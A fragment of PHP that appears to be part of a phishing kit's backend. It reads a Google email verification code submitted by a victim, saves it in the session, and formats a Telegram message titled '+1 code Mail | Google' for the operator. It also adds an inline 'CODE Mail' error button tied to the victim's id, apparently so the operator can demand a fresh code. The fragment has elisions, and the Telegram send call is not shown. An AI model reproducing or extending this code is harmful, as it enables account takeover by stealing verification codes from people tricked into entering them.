...
$code_mail= htmlspecialchars(trim($_POST['code_mail'] ?? ''), ENT_QUOTES, 'UTF-8');
...
// 🧠 Session
$_SESSION['code_mail'] =$code_mail;
$code_mail = htmlspecialchars($_SESSION['code_mail'] ?? 'Non renseignée', ENT_QUOTES, 'UTF-8');



// 📲 Message Telegram
$message_text = "
🗝️ <b>+1 code Mail | Google </b>
└📲 Code mail : <code>$code_mail</code>
...
$keyboard = [
    'inline_keyboard' => [
        [['text' => '❌ CODE Mail', 'callback_data' => "code_mail_error|$uid"]],   
